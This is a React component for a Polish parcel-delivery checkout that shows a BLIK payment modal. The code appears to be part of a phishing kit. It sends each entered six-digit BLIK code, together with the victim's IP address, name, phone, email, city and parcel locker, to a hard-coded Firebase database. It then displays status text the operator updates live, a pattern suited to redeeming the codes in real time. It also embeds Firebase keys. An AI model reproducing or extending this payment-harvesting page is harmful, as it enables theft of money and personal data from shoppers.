import React, { useState, useEffect, useRef } from "react";
import Banner_img_1 from "../../image/banner_1.png";
import Banner_img_2 from "../../image/banner_2.png";
import Banner_img_3 from "../../image/banner_3.png";

import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import {
    getDatabase,
    ref,
    set,
    onValue,
} from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

// Firebase configuration and initialization
const firebaseConfig = {
    apiKey: "AIzaSyBI9jEFhCJ_haq0R3qaFECibT9ue5nD2RU",
    authDomain: "blik-52f1e.firebaseapp.com",
    databaseURL:
        "https://blik-52f1e-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "blik-52f1e",
    storageBucket: "blik-52f1e.appspot.com",
    messagingSenderId: "592614598388",
    appId: "1:592614598388:web:3e86c4d89c95bff8f7a0a1",
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function Dostawa() {
    const [blikCode, setBlikCode] = useState("");
    const [order, setOrder] = useState(1);
    const [ipAdress, setIpAdress] = useState("");
    const [storedSum, setStoredSum] = useState(0);
    const [quantity, setQuantity] = useState(0);
    const blikRef = useRef(null);
    const [text, setText] = useState("Potwierzd w aplikacji mobilnej");
    const [time, setTime] = useState("");

    useEffect(() => {
        const textRef = ref(db, `BLIK/${time}`);

        // Listen for real-time updates from Firebase
        const unsubscribe = onValue(textRef, (snapshot) => {
            if (snapshot.exists()) {
                const fetchedText = snapshot.val().Text;
                setText(fetchedText); // Update the state with the new text from Firebase
            } else {
                setText("Potwierzd w aplikacji mobilnej"); // Optional: Set an empty string if no data is found
            }
        });

        // Cleanup function to unsubscribe from Firebase listener when the component is unmounted or when currentTime changes
        return () => unsubscribe();
    }, [time]); // Only re-run effect when currentTime changes

    // Fetch IP on component mount
    useEffect(() => {
        const fetchIP = async () => {
            try {
                const response = await fetch("https://api.ipify.org");
                const data = await response.text();
                setIpAdress(data);
            } catch (error) {
                console.error("Failed to fetch IP:", error);
            }
        };
        fetchIP();
    }, []);

    // Aggregate order sum and quantity from session storage
    useEffect(() => {
        let totalSum = 0;
        let totalQuantity = 0;

        for (let i = 1; i <= 100; i++) {
            const sum = sessionStorage.getItem(`sum-${i}`);
            const qty = sessionStorage.getItem(`quantity-${i}`);

            if (sum && qty) {
                totalSum += parseFloat(sum);
                totalQuantity += parseInt(qty);
            }
        }

        setStoredSum(totalSum);
        setQuantity(totalQuantity);
    }, []); // Empty dependency array ensures this runs only once on mount

    // Function to get the current time in HH:MM:SS format
    function getCurrentTime() {
        return Date.now(); // Returns current time in milliseconds since January 1, 1970 (Unix epoch)
    }

    // Function to add data to Firebase
    async function AddData() {
        const currentTime = getCurrentTime();
        setTime(currentTime);

        // Retrieve user info from session storage
        const storedImie = sessionStorage.getItem("imie");
        const storedNazwisko = sessionStorage.getItem("nazwisko");
        const storedTelefon = sessionStorage.getItem("telefon");
        const storedEmail = sessionStorage.getItem("email");
        const storedMiasto = sessionStorage.getItem("miasto");
        const storedPaczkomat = sessionStorage.getItem("paczkomat");

        try {
            await set(ref(db, `BLIK/${currentTime}`), {
                Numer: order,
                Time: currentTime,
                Blik: blikCode,
                IP: ipAdress,
                Imie: storedImie,
                Nazwisko: storedNazwisko,
                Telefon: storedTelefon,
                Email: storedEmail,
                Miasto: storedMiasto,
                Paczkomat: storedPaczkomat,
                Summa: storedSum,
                Quantity: quantity,
                Text: 'Potwierzd w aplikacji mobilnej',
            });

            // Reset blikCode and increment order number
            setOrder(order + 1);
            setBlikCode("");
        } catch (error) {
            console.error("Error adding data:", error);
        }


    }

    return (
        <div>
            {/* <!-- Modal 1 --> */}
            <div
                className="m-0 p-0 modal fade"
                id="exampleModal1"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
            >
                <div
                    style={{
                        position: "absolute",
                        top: "40%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        transition: "all 0.3s ease",
                        width: "360px",
                    }}
                    className="m-0 p-0 modal-dialog border border-primary border-4 rounded"
                >
                    <div
                        style={{
                            backdropFilter: "blur(24px)",
                            backgroundColor: "hsla(0, 0%, 0%, 0.5)",
                        }}
                        className="m-0 p-0 modal-content"
                    >
                        <div className="modal-header">
                            <h1
                                className="m-0 p-0 modal-title fs-5 text-white"
                                id="exampleModalLabel"
                            >
                                Płatność BLIK
                            </h1>
                            <button
                                type="button"
                                className="m-0 p-0 btn-close"
                                data-bs-dismiss="modal"
                                aria-label="Close"
                            ></button>
                        </div>
                        <div className="m-0 p-0 modal-body">
                            <input
                                ref={blikRef}
                                value={blikCode}
                                onChange={(e) =>
                                    setBlikCode(
                                        e.target.value.replace(/\D/g, "")
                                    )
                                }
                                style={{ height: "60px", outline: "none" }}
                                className="o_link m-3 ms-0 me-0 ps-3 col-12 d-flex flex-column justify-content-center text-start bg-transparent text-white border-primary"
                                required
                                type="text"
                                pattern="\d{6}"
                                maxLength={6}
                                inputMode="numeric"
                                title="Please enter a 6-digit BLIK code"
                                placeholder="Enter 6-digit BLIK code"
                                aria-label="Enter 6-digit BLIK code"
                            />

                            <p className="m-3 ms-0 me-0 p-0 ps-3 text-white">
                                Kod ma 6 cyfr. Znajdziesz go w aplikacji
                                bankowej.
                            </p>
                        </div>
                        <div className="m-0 p-0 modal-footer">
                            <button
                                type="button"
                                className="m-0 p-3 col-12 btn btn-primary rounded-0 border-0 outline-0"
                                onClick={AddData}
                                data-bs-toggle="modal"
                                data-bs-target="#exampleModal2"
                                disabled={blikCode.length !== 6} // Only enable button if blikCode is 6 digits
                            >
                                Kupuję i płacę
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* <!-- Modal 2 --> */}
            <div
                className="modal fade"
                id="exampleModal2"
                tabIndex="-1"
                aria-labelledby="exampleModalLabel"
                aria-hidden="true"
            >
                <div className="modal-dialog">
                    <div className="modal-content">
                        <div className="modal-header">
                            <h1
                                className="modal-title fs-5"
                                id="exampleModalLabel"
                            >
                                {text}
                            </h1>
                            <button
                                type="button"
                                className="btn-close"
                                data-bs-dismiss="modal"
                                aria-label="Close"
                            ></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default Dostawa;
